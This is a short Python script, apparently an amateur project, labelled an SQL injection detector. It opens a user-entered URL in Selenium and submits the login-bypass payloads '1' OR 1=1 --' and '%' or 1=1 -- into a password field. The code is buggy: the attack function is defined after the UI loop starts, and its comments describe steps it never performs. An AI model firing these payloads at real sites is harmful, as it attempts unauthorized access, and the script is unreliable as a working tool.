# SQL injection detector
# goes through given web page
import time
import tkinter as tk
from tkinter import filedialog
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

def browse_func():
    filename = filedialog.askopenfilename()

def button_click(event):
    url = URLentry.get()
    if (url == ""):
        print("Please enter a url!")

    else:
        runAttacks(url)

# setup UI
window = tk.Tk()
label = tk.Label(text="Please enter a URL")
URLentry = tk.Entry()
startButton = tk.Button(text="Start attack")
startButton.bind("<Button-1>", button_click)
canvas = tk.Canvas(window)
browseButton = tk.Button(canvas, text="Please attach your current database file", command=lambda: button_click(URLentry))

canvas.pack()
label.pack()
URLentry.pack()
browseButton.pack()
startButton.pack()
tk.mainloop()

def runAttacks(url):
    INJECTION_QUERIES = ["1' OR 1=1 --", "%' or 1=1 --"]

    driver = webdriver.Chrome('chromedriver.exe')
    driver.get(url)
    time.sleep(2)
    form1 = driver.find_element_by_name('txtField')
    form2 = driver.find_element_by_name('passField')

    #continue trying until we run out of queries
    for query in INJECTION_QUERIES:
        #we need to input our injections without knowing what inputs require other inputs to submit
        #so loop through every form element not being injected to and fill it with sample data
        form2.send_keys(query)
        form2.submit()
        time.sleep(5)
    driver.quit()